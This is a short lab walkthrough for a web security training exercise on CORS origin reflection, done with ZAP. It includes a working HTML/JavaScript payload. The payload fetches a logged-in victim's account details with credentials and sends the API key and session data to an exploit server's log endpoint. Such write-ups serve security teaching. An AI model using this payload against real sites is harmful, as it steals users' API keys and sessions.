# Lab: CORS vulnerability with basic origin reflection

In ZAP's browser, navigate to the lab and log in as `wiener:peter`. On `/my-account` page you should see `Your API Key is: YOUR-API-KEY`. Under __History__ tab in ZAP, find `/accountDetails` request and check its response body:

```json
{
  "username": "wiener",
  "email": "",
  "apikey": "YOUR-API-KEY",
  "sessions": [
    "YOUR-SESSION-ID"
  ]
}
```

This suggests that site may support CORS. Right-click this request and select "Open in Requester Tab". Add the following header to the request: `Origin: https://example.com` and click Send. Notice that in the response header `Access-Control-Allow-Origin` the origin is reflected. 

Go to exploit server and paste the following script in "Body" section:

> NOTE: The detailed explanation of this script can be find in the [original](README.md) write-up

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

Click "Store" and then "Deliver exploit to victim" to solve the lab.
